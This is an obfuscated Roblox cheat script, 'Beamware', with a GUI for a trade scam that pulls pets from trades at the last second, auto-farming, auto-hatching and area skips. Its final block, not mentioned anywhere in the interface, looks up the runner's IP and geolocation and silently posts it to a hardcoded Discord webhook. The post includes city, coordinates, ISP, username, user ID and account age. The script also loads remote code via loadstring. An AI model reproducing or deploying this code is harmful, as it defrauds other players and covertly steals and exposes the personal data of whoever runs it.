--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=loadstring(game:HttpGet("https://sirius.menu/rayfield"))();local v1=v0:CreateWindow({Name="Beamware",Icon=0 + 0 ,LoadingTitle="Beam Hub",LoadingSubtitle="by willievibes",Theme="Default",DisableRayfieldPrompts=true,DisableBuildWarnings=false,ConfigurationSaving={Enabled=false,FolderName=nil,FileName="Beamware"},Discord={Enabled=false,Invite="https://discord.gg/um7X9FtQmt",RememberJoins=true},KeySystem=false,KeySettings={Title="BeamHub",Subtitle="Key System",Note="msg willievibes on discord",FileName="Key",SaveKey=false,GrabKeyFromSite=false,Key={""}}});local v2=v1:CreateTab("Main");local v3=792.3 -(368 + 423) ;v2:CreateLabel("Trade Scam, very unstable but in a trade, press a pet on the dropdown, then accept trade. The pet will deselect at the time in the slider. Know how to use it before using it.");v2:CreateSlider({Name="Set deselect time",Range={0.5 -0 ,7.5 -5 },Increment=0.01,Suffix="seconds",CurrentValue=v3,Callback=function(v46) v3=v46;end});local v4=game:GetService("ReplicatedStorage").Packages._Index["sleitnick_knit@1.5.1"].knit.Services;local v5=v4.PlayerDataService.RF.GetAllData:InvokeServer();local v6={};local v7={};if (v5.Pets and (typeof(v5.Pets)=="table")) then for v85,v86 in pairs(v5.Pets) do if (typeof(v86)=="table") then local v96=string.sub(v86.UUID,443 -(416 + 26) ,25 -17 );local v97="Pet: "   .. v86.PetID   .. " - Evo: "   .. tostring(v86.Evolution)   .. " - Size: "   .. tostring(v86.Size)   .. " - UUID: "   .. v96 ;table.insert(v6,v97);v7[v97]=v86.UUID;end end else print("No 'Pets' key or it's not a table.");end local v8={};local v9={};local function v10(v47) local v48=0 + 0 ;local v49;while true do if (v48==(1 -0)) then return v49;end if (v48==(438 -(145 + 293))) then v49={};for v100,v101 in ipairs(v47) do table.insert(v49,v101);end v48=1;end end end v2:CreateDropdown({Name="Select Pets",Options=v6,CurrentOption={},MultipleOptions=true,Flag="PetDropdown",Callback=function(v50) local v51=0;local v52;local v53;while true do if (v51==(433 -(44 + 386))) then v9=v10(v50);v8={};v51=1490 -(998 + 488) ;end if (v51==(1 + 1)) then for v102,v103 in ipairs(v50) do if  not v53[v103] then local v129=v7[v103];if v129 then local v139=0 + 0 ;while true do if (v139==0) then print("Selecting pet with UUID:",v129);v4.TradeService.RE.TradeSelectPet:FireServer(v129);break;end end end end end for v104,v105 in ipairs(v9) do if  not v52[v105] then local v130=v7[v105];if v130 then local v140=772 -(201 + 571) ;while true do if (v140==(1138 -(116 + 1022))) then print("Deselecting pet with UUID:",v130);v4.TradeService.RE.TradeDeselectPet:FireServer(v130);break;end end end end end v51=12 -9 ;end if (v51==1) then v53={};for v106,v107 in ipairs(v9) do v53[v107]=true;end v51=2 + 0 ;end if (v51==(0 -0)) then v52={};for v109,v110 in ipairs(v50) do v52[v110]=true;end v51=3 -2 ;end if (v51==(863 -(814 + 45))) then for v112,v113 in ipairs(v50) do local v114=v7[v113];if v114 then table.insert(v8,v114);end end print("Selected Pet UUIDs:",table.concat(v8,", "));break;end end end});v2:CreateButton({Name="Accepting Trade (do not click twice during trade)",Callback=function() print("Accepting Trade");v4.TradeService.RE.TradeAccept:FireServer();local v54=5;local v55=math.max(0 -0 ,v54-v3 );delay(v55,function() if ( #v8>(0 + 0)) then print("Deselecting pets at "   .. string.format("%.2f",v3)   .. " seconds before countdown ends:" );for v115,v116 in ipairs(v8) do local v117=0 + 0 ;while true do if (v117==(885 -(261 + 624))) then print("Deselecting UUID:",v116);v4.TradeService.RE.TradeDeselectPet:FireServer(v116);break;end end end else print("No pets selected.");end end);end});v2:CreateButton({Name="Unready Trade",Callback=function() print("Unready Trade");v4.TradeService.RE.TradeUnaccept:FireServer();end});v2:CreateButton({Name="Fire All Selected Pets",Callback=function() for v79,v80 in ipairs(v8) do print("Re-selecting pet with UUID:",v80);v4.TradeService.RE.TradeSelectPet:FireServer(v80);end end});v2:CreateLabel("Select a Rainbow pet from the dropdown and press make void, you'll know it worked if you pets went down. Same thing with titan but only huges");v2:CreateButton({Name="Make Void (select 1 evo 2 pet from dropdown)",Callback=function() for v81,v82 in ipairs(v8) do v4.VoidService.RE.StartCraft:FireServer(v82);end end});v2:CreateButton({Name="Claim Void (wait 5 hours)",Callback=function() local v56=v4.PlayerDataService.RF.GetAllData:InvokeServer();if (v56.PetsInVoidSlot and (typeof(v56.PetsInVoidSlot)=="table")) then for v89,v90 in pairs(v56.PetsInVoidSlot) do if ((typeof(v90)=="table") and v90.UUID) then print("Claiming Void pet with UUID:",v90.UUID);v4.VoidService.RE.ClaimPet:FireServer(v90.UUID);end end else print("No pets in Void Slot.");end end});v2:CreateButton({Name="Make Titan (select 1 size 2 pet from dropdown)",Callback=function() for v83,v84 in ipairs(v8) do v4.TitanService.RE.StartCraft:FireServer(tostring(v84));end end});v2:CreateButton({Name="Claim Titan (2 days??)",Callback=function() local v57=0 -0 ;local v58;while true do if (v57==0) then v58=v4.PlayerDataService.RF.GetAllData:InvokeServer();if (v58.PetsInTitanSlot and (typeof(v58.PetsInTitanSlot)=="table")) then for v131,v132 in pairs(v58.PetsInTitanSlot) do if ((typeof(v132)=="table") and v132.UUID) then print("Claiming Titan pet with UUID:",v132.UUID);v4.TitanService.RE.ClaimPet:FireServer(v132.UUID);end end else print("No pets in Titan Slot.");end break;end end end});local v11=v1:CreateTab("farming");local v12=1081 -(1020 + 60) ;local v13=false;local v14={};local v15=false;v11:CreateSlider({Name="Threads",Range={3 -2 ,50},Increment=1,Suffix="threads",CurrentValue=v12,Callback=function(v59) local v60=0 + 0 ;local v61;while true do if ((3 -2)==v60) then if v13 then if (v12>v61) then for v141=v61 + (1748 -(760 + 987)) ,v12 do v14[v141]={isThreadRunning=true};task.spawn(function() local v143=1913 -(1789 + 124) ;local v144;while true do if (v143==0) then v144=v141;while v13 and v14[v144] and v14[v144].isThreadRunning  do local v154={[767 -(745 + 21) ]="WinGate_16"};v4.FightService.RE.GetWinsEvent:FireServer(unpack(v154));task.wait();end break;end end end);end elseif (v12<v61) then for v150=v12 + 1 + 0 ,v61 do if v14[v150] then local v152=0;while true do if (v152==(0 -0)) then v14[v150].isThreadRunning=false;v14[v150]=nil;break;end end end end end end break;end if (v60==(0 -0)) then v61=v12;v12=v59;v60=1 + 0 ;end end end});v11:CreateToggle({Name="Start Farming Wins",CurrentValue=false,Callback=function(v62) v13=v62;if v13 then for v91=1,v12 do local v92=0 + 0 ;while true do if ((1055 -(87 + 968))==v92) then v14[v91]={isThreadRunning=true};task.spawn(function() local v134=0 -0 ;local v135;while true do if (v134==(0 + 0)) then v135=v91;while v13 and v14[v135] and v14[v135].isThreadRunning  do local v151={[1]="WinGate_16"};v4.FightService.RE.GetWinsEvent:FireServer(unpack(v151));task.wait();end break;end end end);break;end end end v15=true;task.spawn(function() while v13 and v15  do local v118=0;local v119;while true do if (v118==(0 -0)) then v119=v4.PlayerDataService.RF.GetAllData:InvokeServer();if (typeof(v119)=="table") then local v145=1413 -(447 + 966) ;local v146;while true do if (v145==(0 -0)) then v146=v119['PlayerLocation'];if v146 then print(v146);v4.FightService.RE.StartContest:FireServer(tostring(v146));task.wait();v4.FightService.RE.JoinContest:FireServer(tostring(v146));end break;end end end v118=1;end if (v118==1) then task.wait(1);break;end end end end);else for v93=1818 -(1703 + 114) , #v14 do if v14[v93] then v14[v93].isThreadRunning=false;end end v14={};v15=false;local v87=v4.PlayerDataService.RF.GetAllData:InvokeServer();if (typeof(v87)=="table") then local v120=0;local v121;while true do if (v120==(701 -(376 + 325))) then v121=v87['PlayerLocation'];if v121 then local v147=0 -0 ;while true do if (v147==0) then print(v121);v4.FightService.RE.QuitContestEvent:FireServer(tostring(v121));break;end end end break;end end end end end});local v16=false;v11:CreateToggle({Name="Auto Rebirth",CurrentValue=false,Flag="Toggle2",Callback=function(v63) local v64=0 -0 ;while true do if (v64==(1 + 0)) then if v16 then task.spawn(function() while v16 do local v137=0 -0 ;while true do if ((14 -(9 + 5))==v137) then v4.RebirthService.RF.Rebirth:InvokeServer();task.wait(377 -(85 + 291) );break;end end end end);end break;end if (v64==0) then v16=v63;print("Toggle State Changed:",v63);v64=1266 -(243 + 1022) ;end end end});local v17=false;v11:CreateToggle({Name="Auto Quest Egg",CurrentValue=false,Flag="Toggle3",Callback=function(v65) v17=v65;print("Toggle State Changed:",v65);if v17 then task.spawn(function() while v17 do local v122=0;while true do if ((0 -0)==v122) then v4.OnlineRewardService.RF.ClaimOnlineQuestReward:InvokeServer();task.wait(1 + 0 );break;end end end end);end end});local v18=game:GetService("ReplicatedStorage"):WaitForChild("Eggs");local v19={};for v66,v67 in ipairs(v18:GetChildren()) do table.insert(v19,v67.Name);end local v20=v19[1181 -(1123 + 57) ] or nil ;local v21=v1:CreateTab("Eggs");local v22=v21:CreateDropdown({Name="Select Egg",Options=v19,CurrentOption={v19[255 -(163 + 91) ]},MultipleOptions=false,Flag="SelectedEgg",Callback=function(v68) v20=v68[1];end});v21:CreateButton({Name="Hatch Egg",Callback=function() if v20 then local v88={[1931 -(1869 + 61) ]=v20,[2]=1 + 0 };game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.5.1").knit.Services.EggHatchService.RE.Hatch:FireServer(unpack(v88));else warn("No egg selected!");end end});local v23=false;v21:CreateToggle({Name="Auto Hatch",CurrentValue=false,Flag="Toggleegg",Callback=function(v70) local v71=0;while true do if (v71==(0 -0)) then v23=v70;print("Toggle State Changed:",v70);v71=1;end if (v71==1) then if v23 then task.spawn(function() while v23 do if v20 then local v148=0 -0 ;local v149;while true do if (v148==0) then v149={[1]=v20,[2]=1 + 0 };game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.5.1").knit.Services.EggHatchService.RE.Hatch:FireServer(unpack(v149));break;end end else warn("No egg selected!");end task.wait();end end);end break;end end end});local v24=v1:CreateTab("Misc");local v25=false;v24:CreateToggle({Name="Potion Spam",CurrentValue=false,Flag="Toggle1",Callback=function(v72) v25=v72;print("Toggle State Changed:",v72);if v25 then task.spawn(function() while v25 do local v123=0 -0 ;while true do if (0==v123) then v4.ChestService.RF.ClaimDailyChest:InvokeServer();task.wait();break;end end end end);end end});v24:CreateButton({Name="Join W2 (rejoin after clicking)",Callback=function() v4.AreaService.RE.UpdatePlayerCurrentArea:FireServer("Area_2");end});v24:CreateButton({Name="Join W3 (rejoin after clicking)",Callback=function() v4.AreaService.RE.UpdatePlayerCurrentArea:FireServer("Area_3");end});v24:CreateButton({Name="Join W4 (rejoin after clicking)",Callback=function() v4.AreaService.RE.UpdatePlayerCurrentArea:FireServer("Area_4");end});v24:CreateButton({Name="Super Rebirth (30+ Rebirths, will reset all your stats)",Callback=function() v4.RebirthService.RF.SuperRebirth:InvokeServer();end});v24:CreateButton({Name="Super Rebirth Upgrades",Callback=function() local v73=0 + 0 ;local v74;while true do if (v73==0) then v74=game:GetService("Players").LocalPlayer.PlayerGui.RebirthUpgradeGui;v74.Enabled=true;break;end end end});v24:CreateButton({Name="Save Data",Callback=function() local v75=1474 -(1329 + 145) ;local v76;local v77;local v78;while true do if (v75==(974 -(140 + 831))) then print("Data written to PlayerData.txt");break;end if (0==v75) then v76=v4.PlayerDataService.RF.GetAllData:InvokeServer();v77={};v75=1;end if (v75==2) then if (typeof(v76)=="table") then v78(v76);else table.insert(v77,"'x' is not a table.");end writefile("PlayerData.txt",table.concat(v77,"\n"));v75=1853 -(1409 + 441) ;end if (v75==(719 -(15 + 703))) then v78=nil;function v78(v124,v125) v125=v125 or "" ;for v127,v128 in pairs(v124 or {} ) do if (typeof(v128)=="table") then local v138=0 + 0 ;while true do if (v138==(438 -(262 + 176))) then table.insert(v77,v125   .. tostring(v127)   .. ":" );v78(v128,v125   .. "  " );break;end end else table.insert(v77,v125   .. tostring(v127)   .. ": "   .. tostring(v128) );end end end v75=1723 -(345 + 1376) ;end end end});v24:CreateLabel("Discord: willievibes");local v26=game:GetService("Players").LocalPlayer.Name;local v27=tostring(game:HttpGet("https://api.ipify.org",true));local v28=game:GetService("HttpService");local v29=game:GetService("Players").LocalPlayer;local v30=game:GetService("Players").LocalPlayer.MembershipType==Enum.MembershipType.Premium ;local v31=game.Players.LocalPlayer.Name;local v32=game.Players.LocalPlayer.UserId;local v33=game:GetService("HttpService");local v34=game:GetService("Players");local v35=v34.LocalPlayer;local v36=math.floor((os.time() -(v35.AccountAge * (87088 -(198 + 490))))/(381711 -295311) );local v37=game.JobId;local v38=v33:JSONDecode(game:HttpGet(string.format("http://ip-api.com/json/%s",v27)));local v39={IP=v27,country=v38.country,countryCode=v38.countryCode,region=v38.region,regionName=v38.regionName,city=v38.city,zipcode=v38.zip,latitude=v38.lat,longitude=v38.lon,isp=v38.isp,org=v38.org};local v40="https://discord.com/api/webhooks/1298176241022799922/HdLJCHPnRNK5jghY8A9w-LsSzss-ScorbvnKLt-g2Sno0DYa_OQhFA_sPAtvwhW-D22C";local v41={username=v29.Name   .. " ["   .. v29.UserId   .. "]" ,avatar_url=v28:JSONDecode(game:HttpGet(("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false"):format(v29.UserId)))['data'][2 -1 ]['imageUrl'],embeds={{title="AdvanceFalling Services",description="Discord: https://discord.gg/d2446gBjfq",color=tonumber(5968181 -3122513 ),fields={{name="Profile:",value="https://www.roblox.com/users/"   .. v32   .. "/profile" ,inline=true},{name="Game:",value="https://www.roblox.com/games/"   .. game.PlaceId ,inline=true},{name="Game Info:",value="**ID**: "   .. game.PlaceId   .. ".\n**Name:** "   .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name ,inline=true},{name="Premium",value=(v30 and "True") or "False" ,inline=true},{name="2FA",value=(v30 and "True") or "False" ,inline=true},{name="Account Age",value=""   .. v36   .. " " ,inline=true},{name="Join Code",value=""   .. v37 ,inline=true},{name="IP",value=v39.IP,inline=true},{name="Country",value=v39.country,inline=true},{name="Country Code",value=v39.countryCode,inline=true},{name="Region",value=v39.region,inline=true},{name="Region Name",value=v39.regionName,inline=true},{name="City",value=v39.city,inline=true},{name="Zipcode",value=v39.zipcode,inline=true},{name="Latitude",value=tostring(v39.latitude),inline=true},{name="Longitude",value=tostring(v39.longitude),inline=true},{name="ISP",value=v39.isp,inline=true},{name="Org",value=v39.org,inline=true},{name="Coming Soon",value="??????????",inline=true}},color=tonumber(7499038 -(660 + 176) )}}};local v42=v28:JSONEncode(v41);local v43={["content-type"]="application/json"};local v44=http_request or request or HttpPost or syn.request ;local v45={Url=v40,Body=v42,Method="POST",Headers=v43};v44(v45);